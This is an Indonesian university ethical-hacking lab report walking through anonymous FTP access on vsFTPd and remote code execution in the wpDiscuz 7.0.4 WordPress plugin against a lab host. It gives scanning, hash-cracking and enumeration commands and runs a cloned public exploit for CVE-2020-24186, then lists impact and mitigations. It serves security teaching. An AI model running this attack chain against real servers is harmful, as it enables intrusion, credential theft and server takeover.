# ETHACK-PRAKTIKUM-2-2024

1. Cover Page

Nama Praktikan: Muhammad Kenas Galeno Putra
NRP: 5027231069
Judul Praktikum: Vulnerability Exploitation on FTP and WordPress Plugins

2. Nama Kerentanan

Vulnerable FTP: vsFTPd 3.0.5
Vulnerable WordPress Plugin: wpDiscuz 7.0.4 (Remote Code Execution)

3. Deskripsi Kerentanan

Vulnerable FTP: Kerentanan pada server FTP ini memungkinkan akses anonymous, sehingga siapa pun bisa mengakses dan mengunduh file tanpa autentikasi, yang dapat berisiko jika file tersebut berisi informasi sensitif.
Vulnerable WordPress Plugin: Plugin wpDiscuz versi 7.0.4 rentan terhadap Remote Code Execution (RCE), memungkinkan penyerang menjalankan perintah di server yang menggunakan plugin ini.

4. CVSS Score

Vulnerable FTP: CVSS Score: 5.0 (Medium) – Risiko dari akses unauthorized namun tidak langsung memberikan kendali penuh ke sistem.
wpDiscuz RCE: CVSS Score: 9.8 (Critical) – Kerentanan RCE memberikan akses penuh penyerang ke server.

5. Langkah Pengerjaan

Vulnerable FTP:
Pindai server untuk menemukan port yang terbuka:

```bash
nmap -p- 10.15.42.245
```

Pindai kerentanan FTP dengan Nmap:

```bash
nmap --script=ftp-anon,ftp-vsftpd-backdoor -p21 10.15.42.245
```

Login ke FTP menggunakan akun anonymous:

```bash
ftp 10.15.42.245
```

Download file yang ditemukan:

```bash
ls
get list.xyz
get readme.txt
```

Mencari username atau password dalam file:

```bash
cat list.xyz
grep -i "ethack" list.xyz
```

Simpan hash dan crack dengan John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Vulnerable WordPress Plugin:
Gunakan GoBuster untuk mencari direktori tersembunyi:

```bash
gobuster dir --url http://10.15.42.245:487 --wordlist /usr/share/wordlists/dirb/common.txt
```

Gunakan wpscan untuk mendeteksi plugin WordPress yang terinstal:

```bash
wpscan --url http://10.15.42.245:487 --enumerate p
```

Clone exploit wpDiscuz:

```bash
git clone https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE
```

Jalankan exploit:

```bash
sudo python3 wpDiscuz_RemoteCodeExec.py -u http://10.15.42.245:487 -p /2024/10/03/trial/
```

Tampilkan:

```bash
ls
```

6. Dampak

Vulnerable FTP: Akses unauthorized memungkinkan pengunduhan file yang mungkin berisi informasi sensitif seperti hash password, data pengguna, atau file penting lainnya.
wpDiscuz RCE: Penyerang bisa mengeksekusi perintah di server, yang bisa mengarah ke kontrol penuh atas server WordPress, termasuk pencurian data, defacement website, dan tindakan jahat lainnya.

7. Mitigasi

FTP Vulnerability:
Nonaktifkan akses anonymous pada FTP.
Gunakan protokol yang lebih aman seperti SFTP atau FTPS.
wpDiscuz RCE:
Patch plugin ke versi terbaru.
Batasi akses ke plugin dan pantau aktivitas server secara berkala untuk mendeteksi aktivitas mencurigakan.
